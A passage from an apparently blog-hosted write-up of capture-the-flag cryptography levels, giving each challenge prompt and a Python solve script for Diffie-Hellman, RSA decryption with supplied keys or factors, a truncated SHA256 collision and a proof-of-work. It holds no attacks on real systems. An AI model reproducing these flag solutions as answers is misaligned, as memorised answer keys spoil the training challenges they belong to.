class="hljs-built_in">print</span>(<span class="hljs-string">&quot;error&quot;</span>)<br>        exit(-<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">else</span>:<br>        log.success(<span class="hljs-string">&quot;flag : &quot;</span> + flag)<br><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h4 id="level6-3"><a href="#level6-3" class="headerlink" title="level6"></a>level6</h4><blockquote><p>Perform a Diffie-Hellman key exchange to establish a shared secret</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this series of challenges, you will be working with various cryptographic mechanisms.<br><br>In this challenge you will perform a Diffie-Hellman key exchange.<br><br><br>p: 0xffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece45b3dc2007cb8a163bf0598da48361c55d39a69163fa8fd24cf5f83655d23dca3ad961c62f356208552bb9ed529077096966d670c354e4abc9804f1746c08ca18217c32905e462e36ce3be39e772c180e86039b2783a2ec07a28fb5c55df06f4c52c9de2bcbf6955817183995497cea956ae515d2261898fa051015728e5a8aacaa68ffffffffffffffff<br>g: 0x2<br>A: 0xc1c09760c9dedd93dc0a15fe9af7466b23591b379bd5f17f1482e015aac5ee0417b535c64a19096c56f9bd193daa37c27ce5a320484ad9f8b66a416da09d488f4244543c57e20e5e3cb3ce716d3b5a037bd95bd5ad9dc56fe18f829a877d1441deb8c5fdfb6576a94c63e166b98bda836895c7eec6d30672d739d3e6990e74fd931f5a4038dc7b4cba8d87c3c9a3cf09ff203a7e02ae297659b0b534229e859c1fc06b9a7cf41167386560aade7b5526ea4ce319ffe1c5c581925d72597ede72c9349069d8d25efd81e9e6ebe2a0c565ed173d0fff44089a73b82ce8352d98812274184ba6d49c0c13d8af240e75ddb1ab521fd2e069ca86cc46b3ad5cd0ac7<br>B: 0xb53f64b421db954ff626bbe4e32e7673b9d94864be22af94ef01fc8e091b7d14d357818519fcb4a1ef388df179d1bbde84339af1b16d2aa5bc4435ce37dd229e694f3530285d4ff63f3c47b28548fb482b2c8a9a7e1c8b850d418514bf9581b181c79619ed0d6aabaf01936964f7a9a44581a3385193f3f013c8d6b0b26bcf0cb877d60b43557616c41750c8cf9af53fbf68c019786b99b36e53c3588136a08c3efa2f417cc165312aeddbee92a3206871fc73ad2eac5c19ae09c9e3499e879ff74b42792dc01618bff6569549027866717663cfa1e53b2713a2642fc5c6d6b50587c60879cb20189e50aeef85af3c794e059cd8250964e8c44d71a5e59fbd9d<br>secret ciphertext (b64): vvhJt4t2G/vdwh8xG5t+IYia0nFJD+p8gflyMkoEnVBHtYwshkPd3Ai35VrHMOSEH+qM/z8HlZP5EQ==<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getRandomNBitInteger<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">from</span> Crypto.Util.strxor <span class="hljs-keyword">import</span> strxor<br><span class="hljs-keyword">import</span> base64<br><br>p = <span class="hljs-number">0xffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece45b3dc2007cb8a163bf0598da48361c55d39a69163fa8fd24cf5f83655d23dca3ad961c62f356208552bb9ed529077096966d670c354e4abc9804f1746c08ca18217c32905e462e36ce3be39e772c180e86039b2783a2ec07a28fb5c55df06f4c52c9de2bcbf6955817183995497cea956ae515d2261898fa051015728e5a8aacaa68ffffffffffffffff</span><br>g = <span class="hljs-number">0x2</span><br>A = <span class="hljs-number">0xc1c09760c9dedd93dc0a15fe9af7466b23591b379bd5f17f1482e015aac5ee0417b535c64a19096c56f9bd193daa37c27ce5a320484ad9f8b66a416da09d488f4244543c57e20e5e3cb3ce716d3b5a037bd95bd5ad9dc56fe18f829a877d1441deb8c5fdfb6576a94c63e166b98bda836895c7eec6d30672d739d3e6990e74fd931f5a4038dc7b4cba8d87c3c9a3cf09ff203a7e02ae297659b0b534229e859c1fc06b9a7cf41167386560aade7b5526ea4ce319ffe1c5c581925d72597ede72c9349069d8d25efd81e9e6ebe2a0c565ed173d0fff44089a73b82ce8352d98812274184ba6d49c0c13d8af240e75ddb1ab521fd2e069ca86cc46b3ad5cd0ac7</span><br>b = getRandomNBitInteger(<span class="hljs-number">1024</span>)<br>B = <span class="hljs-built_in">pow</span>(g,b,p)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(B))<br><br>b64chiper = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;input b64chiper: &quot;</span>)<br>chiper = base64.b64decode(b64chiper)<br><br>s = <span class="hljs-built_in">pow</span>(A,b,p)<br>key = s.to_bytes(<span class="hljs-number">256</span>,<span class="hljs-string">&quot;little&quot;</span>)<br><br>flag = strxor(chiper,key[:<span class="hljs-built_in">len</span>(chiper)])<br><span class="hljs-built_in">print</span>(flag)<br><br></code></pre></td></tr></table></figure><h4 id="level7-3"><a href="#level7-3" class="headerlink" title="level7"></a>level7</h4><blockquote><p>Decrypt an RSA-encrypted secret using provided public and private keys</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this series of challenges, you will be working with various cryptographic mechanisms.<br><br>In this challenge you will decrypt a secret encrypted with RSA (Rivest–Shamir–Adleman).<br>You will be provided with both the public key and private key.<br><br><br>e: 0x10001<br>d: 0x69c8e5572e7909a99ecf482a5d4a6c245ee3db5ffd2833fc1ea0421a43e75869d6c415a6b36ae666e11800b8e260dbd3b8cf268bfc592ecac73d02b1238be480abacfa57ad7e012aa2abf47b656572f04f09a9659406c13c2496d4e5828d6092b240156324c5813a4092c4d5d0ce662be7d8db7bd2ce5c41d5609ab8f906683a3f5632dc5394bdcf426a8439f513f82914ac343121f59fccef286f16998010a2922b5364207774137eab956608b239baf040b113fbec410945e92a9bfeff566b4b1c27a878622fc201f50cf5374acb42aa36dda5909b3b44bcf0c08b3dfbd3010c01c87c54e549563bf056bdb132b68c25a5ac82a37a10eaaf7302c8dbc29c81<br>n: 0xe2794928683c255a7d1d31b03b50a984ed09046a0b3db9fd69a4265b1a8a415f7edcade6b853fa20a4d63c26f67b26bdb4a0285e38d7c8e7eeabafb3c8b6d7dd1426b8384359cdf67712d3678bdd8c5ff42cc2cfd7b1c4d0ea95341e91cda626c281c95e3fd46e1e5254cf557289aced59ec2872a7cee2dda8d8e58db2301cea181c71663bb3f5abdaae459fbc358a8d40340223c742a2b142b82eeeb53b12370f93e8bdf62a801bcc3e5a1ae8060bce87c033f3a573e65a984a301cabb29530256887c38ac69cece9abba3eac28dfb4ef1825c39295d2911dacb1bc06ae512f008bebe86b6fba9c074b481f6185a7be3e823cf577de0c8224fb788d32a736cf<br>secret ciphertext (b64): fFFCmUmD42Qiesdwsm9RX6dqYjjQRyqBAtMbcnnPklcslRrnHx2JjguShjB8uFN6e+r9dq6okTRZIGax4dxau85Btmj457FviQm0+sUxdTw7mmQNEir29Q2+/VrJTsQ4oV2b1ITtlzLlfC8QVRV5Qmzh857ecrboiqvDh8sj6ye1IeepnPrLm0WS/WFJNFXeZJzvctBjzSSCMx6665VjwDZnlPctFH87zoKeMWgudDfTQ2ZKaZjul7GQsqegdV//u8z5T9auBaoEQCiskWYzJDMo+2n34x24TH3ml6aTY5InuEZNX7sFG/W4WMHOtbRRIwfWqLT7/cT9BEOfIkTrYA==<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes,bytes_to_long<br><span class="hljs-keyword">import</span> base64<br><br>e = <span class="hljs-number">0x10001</span><br>d = <span class="hljs-number">0x69c8e5572e7909a99ecf482a5d4a6c245ee3db5ffd2833fc1ea0421a43e75869d6c415a6b36ae666e11800b8e260dbd3b8cf268bfc592ecac73d02b1238be480abacfa57ad7e012aa2abf47b656572f04f09a9659406c13c2496d4e5828d6092b240156324c5813a4092c4d5d0ce662be7d8db7bd2ce5c41d5609ab8f906683a3f5632dc5394bdcf426a8439f513f82914ac343121f59fccef286f16998010a2922b5364207774137eab956608b239baf040b113fbec410945e92a9bfeff566b4b1c27a878622fc201f50cf5374acb42aa36dda5909b3b44bcf0c08b3dfbd3010c01c87c54e549563bf056bdb132b68c25a5ac82a37a10eaaf7302c8dbc29c81</span><br>n = <span class="hljs-number">0xe2794928683c255a7d1d31b03b50a984ed09046a0b3db9fd69a4265b1a8a415f7edcade6b853fa20a4d63c26f67b26bdb4a0285e38d7c8e7eeabafb3c8b6d7dd1426b8384359cdf67712d3678bdd8c5ff42cc2cfd7b1c4d0ea95341e91cda626c281c95e3fd46e1e5254cf557289aced59ec2872a7cee2dda8d8e58db2301cea181c71663bb3f5abdaae459fbc358a8d40340223c742a2b142b82eeeb53b12370f93e8bdf62a801bcc3e5a1ae8060bce87c033f3a573e65a984a301cabb29530256887c38ac69cece9abba3eac28dfb4ef1825c39295d2911dacb1bc06ae512f008bebe86b6fba9c074b481f6185a7be3e823cf577de0c8224fb788d32a736cf</span><br>b64cipher = <span class="hljs-string">&quot;fFFCmUmD42Qiesdwsm9RX6dqYjjQRyqBAtMbcnnPklcslRrnHx2JjguShjB8uFN6e+r9dq6okTRZIGax4dxau85Btmj457FviQm0+sUxdTw7mmQNEir29Q2+/VrJTsQ4oV2b1ITtlzLlfC8QVRV5Qmzh857ecrboiqvDh8sj6ye1IeepnPrLm0WS/WFJNFXeZJzvctBjzSSCMx6665VjwDZnlPctFH87zoKeMWgudDfTQ2ZKaZjul7GQsqegdV//u8z5T9auBaoEQCiskWYzJDMo+2n34x24TH3ml6aTY5InuEZNX7sFG/W4WMHOtbRRIwfWqLT7/cT9BEOfIkTrYA==&quot;</span><br><br>cipher = base64.b64decode(b64cipher)<br>c = bytes_to_long(cipher[::-<span class="hljs-number">1</span>])<br>m = <span class="hljs-built_in">pow</span>(c,d,n)<br>flag = long_to_bytes(m)[::-<span class="hljs-number">1</span>]<br><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h4 id="level8-3"><a href="#level8-3" class="headerlink" title="level8"></a>level8</h4><blockquote><p>Decrypt an RSA-encrypted secret using the provided prime factors of n</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this series of challenges, you will be working with various cryptographic mechanisms.<br><br>In this challenge you will decrypt a secret encrypted with RSA (Rivest–Shamir–Adleman).<br>You will be provided with the prime factors of n.<br><br><br>e: 0x10001<br>p: 0xeb0eedde9f594d1b111f52728bf67e5925bf2a3bae9a30c618ac2e74865d15b758e2462dcae46926dc7ea84f383c5d21df36a75e8236055ca4c07c77e798d801ed1ca516707e284e6b129762c7ba5e42591cceaf56f170bc530fb4fe6991120fb74cc1a7826a80ca43221822559d502ab25bb5d04516e02ae20a25aa03694e45<br>q: 0xffb7dc5f2b9822aa854d05d9aaef7d3c84eae9cb826e78fe32d1498562e2b535931e6f49e05023ec423641f8fe850de5a7f8132d1856f2e018437c71b39e038a5e820e88db5fbe3d4a8c84a287e77d894ad3dfeffd92fa09b2c4353680130a105099b86b0d0ad71350951c3b67889ab9c1c8326d50e8f0a02b855e0a92f48d3f<br>secret ciphertext (b64): fwcvHfWZXTYBJXUc5Fa1qo/lgox68yZ4wnvG9PsqV2WFgKHrRxejnOKdoV8AFb4RxLGnHoYBXE/4AUsHmTIU0uffmnj4xxslpo0wwVOlXwnR7Z4mgejZnRtN2ZsfzKuWVCxnaKYbV9KCbfPe83TqqiWnnp8OwdS2UMWvAUds3G7gbyJK/JhbW5ezbk1iIK3qb5rKjYJpRtJ0fciF4EzxlzHeksAjYl19tuDQbnHO/e/A7DrTb6kJ3bdaBgCU9QqfqqzoJbzxwJMvWnQxCwCkMd5hvkTljJelLnUenJoLTMrO57+Qd1yXiMxK6eZ4R1Kzm79ZwWWRLPAdn/LjuLiXBA==<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes,bytes_to_long<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> libnum<br><br>e = <span class="hljs-number">0x10001</span><br>p = <span class="hljs-number">0xeb0eedde9f594d1b111f52728bf67e5925bf2a3bae9a30c618ac2e74865d15b758e2462dcae46926dc7ea84f383c5d21df36a75e8236055ca4c07c77e798d801ed1ca516707e284e6b129762c7ba5e42591cceaf56f170bc530fb4fe6991120fb74cc1a7826a80ca43221822559d502ab25bb5d04516e02ae20a25aa03694e45</span><br>q = <span class="hljs-number">0xffb7dc5f2b9822aa854d05d9aaef7d3c84eae9cb826e78fe32d1498562e2b535931e6f49e05023ec423641f8fe850de5a7f8132d1856f2e018437c71b39e038a5e820e88db5fbe3d4a8c84a287e77d894ad3dfeffd92fa09b2c4353680130a105099b86b0d0ad71350951c3b67889ab9c1c8326d50e8f0a02b855e0a92f48d3f</span><br>b64cipher = <span class="hljs-string">&quot;fwcvHfWZXTYBJXUc5Fa1qo/lgox68yZ4wnvG9PsqV2WFgKHrRxejnOKdoV8AFb4RxLGnHoYBXE/4AUsHmTIU0uffmnj4xxslpo0wwVOlXwnR7Z4mgejZnRtN2ZsfzKuWVCxnaKYbV9KCbfPe83TqqiWnnp8OwdS2UMWvAUds3G7gbyJK/JhbW5ezbk1iIK3qb5rKjYJpRtJ0fciF4EzxlzHeksAjYl19tuDQbnHO/e/A7DrTb6kJ3bdaBgCU9QqfqqzoJbzxwJMvWnQxCwCkMd5hvkTljJelLnUenJoLTMrO57+Qd1yXiMxK6eZ4R1Kzm79ZwWWRLPAdn/LjuLiXBA==&quot;</span><br><br>cipher = base64.b64decode(b64cipher)<br>c = bytes_to_long(cipher[::-<span class="hljs-number">1</span>])<br><br>n = p * q<br>phi = (p-<span class="hljs-number">1</span>) * (q-<span class="hljs-number">1</span>)<br>d = libnum.invmod(e,phi)<br>m = <span class="hljs-built_in">pow</span>(c,d,n)<br>flag = long_to_bytes(m)[::-<span class="hljs-number">1</span>]<br><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h4 id="level9-3"><a href="#level9-3" class="headerlink" title="level9"></a>level9</h4><blockquote><p>Find a small hash collision using SHA256, considering only the first 2 bytes</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this challenge you will hash data with a Secure Hash Algorithm (SHA256).<br>You will find a small hash collision.<br>Your goal is to find data, which when hashed, has the same hash as the secret.<br>Only the first 2 bytes of the SHA256 hash are considered.<br><br><br>secret sha256[:2] (b64): mMQ=<br>collision (b64):<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><br>secret = base64.b64decode(<span class="hljs-string">&quot;mMQ=&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">256</span>):<br>            ans = <span class="hljs-built_in">bytes</span>([i, j, k])<br>            sha256_ans = sha256(ans).digest()<br>            <span class="hljs-keyword">if</span> sha256_ans[:<span class="hljs-number">2</span>] == secret[:<span class="hljs-number">2</span>]:<br>                <span class="hljs-built_in">print</span>(base64.b64encode(ans).decode())<br>                <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h4 id="level10-3"><a href="#level10-3" class="headerlink" title="level10"></a>level10</h4><blockquote><p>Compute a small proof-of-work by appending response data to the challenge data, resulting in a SHA256 hash with 2 null-bytes</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this challenge you will hash data with a Secure Hash Algorithm (SHA256).<br>You will compute a small proof-of-work.<br>Your goal is to find response data, which when appended to the challenge data and hashed, begins with 2 null-bytes.<br><br><br>challenge (b64): P6Q7okZS0h5ckIDGB9SGOLuxd+ZBuIzWNTlToOQGYrU=<br>response (b64):<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">import</span> base64<br><br>challenge = base64.b64decode(<span class="hljs-string">&quot;P6Q7okZS0h5ckIDGB9SGOLuxd+ZBuIzWNTlToOQGYrU=&quot;</span>)<br><br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">if</span> sha256(challenge + <span class="hljs-built_in">str</span>(i).encode()).digest()[:<span class="hljs-number">2</span>] == <span class="hljs-string">b&quot;\0\0&quot;</span>:<br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-built_in">print</span>(base64.b64encode(<span class="hljs-built_in">str</span>(i).encode()))<br>        <span class="hljs-keyword">break</span><br>    i += <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h4 id="level11-3"><a href="#level11-3" class="headerlink" title="level11"></a>level11</h4><blockquote><p>Complete an RSA challenge-response using provided public and private keys</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this challenge you will complete an RSA challenge-response.<br>You will be provided with both the public key and private key.<br><br><br>e: 0x10001<br>d: 0x2a2d9ce51936251ddaabdd033214cb73750741c657dd57d5099c6fa0d53c6bb2c8db94871402ce97bd7959f15d15f30cfc018d13f146b0caebd40eb5db1d867b323d0291c0208cb5252f47ef2b4459d3a2ff91b4a2547c2c786e12eb6f679d08922b90e0d1057c7a5fe68cca785847f2f664fb8fb1fd8f314ed9aaecf78d525b1ffa0e6d175fd8e74729d94134c8a82f0dc7f1283a6d56e5894a99049eb4d0d5c1ee9758d59ff02db14cde859ffb832cc7cc64387c4178578f7e842f4928a21e7b40c99d4295ad512e579856a4b02d8380d88e56d7884280508b7a141999430bbb55eeed60f6d49fde7c552314308a42481c0dc453a1c790dd3a86660c0feb59<br>n: 0xe0c0a43e27a835de514134b43c876923ea537129449e9a09658b415d1f44da89ae14b7f959bad3128c1b0c0664056a2751f568356afadc362192dbe27b2b23f646110b1185087284212558138c97e30692e4c4a959617c5899950a605651cf96be8a65e006cab98a1260b8309042f239c9ec19a867046aa185e1308843521cb304516f324d48b2900903c4067e4f6fc37286d76f8a4a5d45f5bb1b3dd4afb1ae24bdbf46b52e31fc230d0ca12774538f1cbc9e3ff58a90878e103451278be8a88bd96de03bd083e16daaeafc35d6726b7084d0c6191744588579e3779f0d6eb2aaac97451239fd03c56f32d56706c1f67c000d0d050c068664a458a65af4d62f<br>challenge: 0xd0b3436468b8f3295c5fa753d49d58ce314bf3bab799deda1afb25e00936802518db9a902471e597391d0a19d2a80d7d32db15d7444c3cd601deecdf53400d6041e81086c13f07497765c4f122af8644c639491dbefa264f99d3efdb30bc722e775a3d6ccb462e872ef73d837f065328f7e954aed0fb1ae6db930c1bb82a04f3a68c75c9b26197142f17f0a82dbce181a86b4cacf5c96cbaf796167957562f66705fab010b2738929dd2be083a79cd03fb91cf8446356e6a94d92b8e5b873e6a0e3b6a99d604dc53e71d7501287c3a3d70fb0d6d9a6be45cbaef43b04e752537fa32f0d4eb82f5e6ce1e05e511025d7d5a63d1e170432cb6537acf7d30596af8<br>response:<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br>e = <span class="hljs-number">0x10001</span><br>d = <span class="hljs-number">0x2a2d9ce51936251ddaabdd033214cb73750741c657dd57d5099c6fa0d53c6bb2c8db94871402ce97bd7959f15d15f30cfc018d13f146b0caebd40eb5db1d867b323d0291c0208cb5252f47ef2b4459d3a2ff91b4a2547c2c786e12eb6f679d08922b90e0d1057c7a5fe68cca785847f2f664fb8fb1fd8f314ed9aaecf78d525b1ffa0e6d175fd8e74729d94134c8a82f0dc7f1283a6d56e5894a99049eb4d0d5c1ee9758d59ff02db14cde859ffb832cc7cc64387c4178578f7e842f4928a21e7b40c99d4295ad512e579856a4b02d8380d88e56d7884280508b7a141999430bbb55eeed60f6d49fde7c552314308a42481c0dc453a1c790dd3a86660c0feb59</span><br>n = <span class="hljs-number">0xe0c0a43e27a835de514134b43c876923ea537129449e9a09658b415d1f44da89ae14b7f959bad3128c1b0c0664056a2751f568356afadc362192dbe27b2b23f646110b1185087284212558138c97e30692e4c4a959617c5899950a605651cf96be8a65e006cab98a1260b8309042f239c9ec19a867046aa185e1308843521cb304516f324d48b2900903c4067e4f6fc37286d76f8a4a5d45f5bb1b3dd4afb1ae24bdbf46b52e31fc230d0ca12774538f1cbc9e3ff58a90878e103451278be8a88bd96de03bd083e16daaeafc35d6726b7084d0c6191744588579e3779f0d6eb2aaac97451239fd03c56f32d56706c1f67c000d0d050c068664a458a65af4d62f</span><br>c = <span class="hljs-number">0xd0b3436468b8f3295c5fa753d49d58ce314bf3bab799deda1afb25e00936802518db9a902471e597391d0a19d2a80d7d32db15d7444c3cd601deecdf53400d6041e81086c13f07497765c4f122af8644c639491dbefa264f99d3efdb30bc722e775a3d6ccb462e872ef73d837f065328f7e954aed0fb1ae6db930c1bb82a04f3a68c75c9b26197142f17f0a82dbce181a86b4cacf5c96cbaf796167957562f66705fab010b2738929dd2be083a79cd03fb91cf8446356e6a94d92b8e5b873e6a0e3b6a99d604dc53e71d7501287c3a3d70fb0d6d9a6be45cbaef43b04e752537fa32f0d4eb82f5e6ce1e05e511025d7d5a63d1e170432cb6537acf7d30596af8</span><br><br>m = <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">pow</span>(c,d,n))<br><span class="hljs-built_in">print</span>(m)<br></code></pre></td></tr></table></figure><h4 id="level12-3"><a href="#level12-3" class="headerlink" title="level12"></a>level12</h4><blockquote><p>Complete an RSA challenge-response by providing the public key</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this challenge you will complete an RSA challenge-response.<br>You will provide the public key.<br><br>e:<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>e = <span class="hljs-number">0x10001</span><br>n = <span class="hljs-number">0x554f65ccb6cd9db91fceb4a32bd6173b09f9324de043cc9037c2c5e7fc2bb241556c0b75787a54bbc112006a66649144abdc570c87810dd7431e09ceaa6ffb680f3306d6355719419b1e59</span><br>p = <span class="hljs-number">0x84a7b001cfa7c6d9a3c200e02911dc8407b6f866b6274f2befed0ca37b45e80f1c50d25313d</span><br>q = <span class="hljs-number">0xa4a20d5fd52bff62c545f5e59bec13171d23f30377eee42e8e34af89e37fb2f70951fff7b4d</span><br>d = <span class="hljs-number">0xd4806263fd37519ac1d073c5c07c1a81c5e6279834faada4d0412c1921dcf6ba27be6b0cc2502e1353888f9c1c88d8027e9abb468de664629d0c6b32c0437040ce375cb2afbdb7fb90cf1</span><br><br>challenge = <span class="hljs-number">0x503bc7acf3ed48873eb4bcc536595ab8b9c1735623fc2a20ccbb996dfcc9b5267b4c35ca7ef1427f18fd51fdb36df4c3766ef7014a041165697e83634bbefdc6</span><br>response = <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">pow</span>(challenge,d,n))<br><span class="hljs-comment"># print(response)</span><br><br>secret = <span class="hljs-string">b&quot;5armTxpBW9R088ISVKmp9xDOT67NLuOpbza/kW2BAIZfrjrluu15Xv3UyItjM3T8YVs/cbjYmUuxxzBLX3/hPwMegGGYlYxVfIdOAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==&quot;</span><br>secret = base64.b64decode(secret)<br><br>c = <span class="hljs-built_in">int</span>.from_bytes(secret, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br>m = <span class="hljs-built_in">pow</span>(c,d,n)<br>flag =  m.to_bytes((m.bit_length() + <span class="hljs-number">7</span>) &gt;&gt; <span class="hljs-number">3</span>, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h4 id="level13-3"><a href="#level13-3" class="headerlink" title="level13"></a>level13</h4><blockquote><p>Sign a user certificate using a provided self-signed root certificate and root private key</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code 